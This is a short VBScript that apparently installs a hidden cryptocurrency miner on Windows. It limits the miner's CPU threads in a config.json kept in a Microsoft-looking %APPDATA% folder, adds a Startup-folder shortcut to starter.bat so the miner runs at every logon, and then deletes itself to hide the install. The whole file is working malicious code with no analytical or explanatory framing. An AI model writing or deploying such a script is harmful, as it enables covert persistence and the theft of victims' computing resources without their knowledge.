Option Explicit

Dim objFSO, objShell, objWMI, colProcessors, objProcessor
Dim threads, maxThreads, jsonFile, jsonContent, startupFolder, shortcutPath, starterBatPath

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
Set objWMI = GetObject("winmgmts:\\.\root\cimv2")

Set colProcessors = objWMI.ExecQuery("Select * from Win32_Processor")
For Each objProcessor In colProcessors
    threads = objProcessor.NumberOfLogicalProcessors
    Exit For
Next

If IsEmpty(threads) Or threads = "" Then
    MsgBox "Failed to detect CPU threads. Exiting."
    WScript.Quit
End If

maxThreads = Int(threads / 4)
If maxThreads < 1 Then maxThreads = 1

jsonFile = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MyFolderM\config.json")
startupFolder = objShell.SpecialFolders("Startup")
shortcutPath = startupFolder & "\starter.bat.lnk"  ' Change shortcut target to starter.bat
starterBatPath = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MyFolderM\starter.bat")  ' Ensure the correct path for starter.bat

If Not objFSO.FileExists(jsonFile) Then
    MsgBox "config.json not found in the current directory. Exiting."
    WScript.Quit
End If

Dim objFile, json
Set objFile = objFSO.OpenTextFile(jsonFile, 1, False)
jsonContent = objFile.ReadAll
objFile.Close

jsonContent = Replace(jsonContent, """max-threads-hint"": 100", """max-threads-hint"": " & maxThreads)

Set objFile = objFSO.OpenTextFile(jsonFile, 2, False)
objFile.Write jsonContent
objFile.Close

' Create a shortcut to the starter.bat in the Startup folder
Dim shortcut
Set shortcut = objShell.CreateShortcut(shortcutPath)
shortcut.TargetPath = starterBatPath
shortcut.WorkingDirectory = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MyFolderM")  ' Correct working directory for starter.bat
shortcut.Save

Dim selfPath
selfPath = WScript.ScriptFullName
CreateObject("Scripting.FileSystemObject").DeleteFile selfPath
